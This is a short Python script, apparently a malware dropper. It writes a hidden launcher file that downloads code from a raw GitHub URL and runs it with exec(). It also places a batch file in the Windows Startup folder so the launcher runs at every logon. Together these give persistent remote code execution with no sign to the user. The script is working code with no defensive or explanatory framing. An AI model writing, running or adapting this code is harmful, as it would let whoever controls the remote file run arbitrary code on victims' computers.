import os
ruta_launcher = r"C:\mzci\launcher.pyw"
os.makedirs(os.path.dirname(ruta_launcher), exist_ok=True)
codigo_launcher = '''import requests
url = "https://raw.githubusercontent.com/mrmorcilla/insha/main/cowd.py"
try:
    response = requests.get(url)
    if response.status_code == 200:
        codigo = response.text
        exec(codigo, globals())
    else:
        print(f"Error al descargar el script: {response.status_code}")
except Exception as e:
    print("Error en la ejecución:", e)
'''
cowdbath = '''
@echo off
start "" "C:\mzci\launcher.pyw"
'''
with open(ruta_launcher, "w", encoding="utf-8") as f:
    f.write(codigo_launcher)
print(f"launcher.py creado en: {ruta_launcher}")
startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
ruta_bat = os.path.join(startup_folder, "open.bat")
contenido_bat = cowdbath
with open(ruta_bat, "w", encoding="utf-8") as f:
    f.write(contenido_bat)
print(f"open.bat creado en: {ruta_bat}")
